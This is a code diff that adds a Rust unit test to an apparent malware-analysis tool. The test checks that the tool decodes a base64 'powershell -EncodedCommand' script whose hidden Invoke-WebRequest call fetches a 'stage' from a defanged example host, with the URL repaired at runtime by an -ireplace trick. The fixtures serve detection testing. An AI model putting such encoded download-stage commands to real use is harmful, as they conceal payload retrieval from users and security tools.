@@ -14727,6 +14727,28 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_ireplace_literal_is_case_insensitive() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ('hXXps://ps-ireplace-ci.example/stage' -ireplace 'xx','tt')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("https://ps-ireplace-ci.example/stage"),
+            "PowerShell -ireplace should normalize case-insensitive replacement: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_double_quoted_ireplace_literal_resolves_url() {
         use base64::Engine;
         let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-ireplace-dq.example/stage" -ireplace "xx","tt")"#;
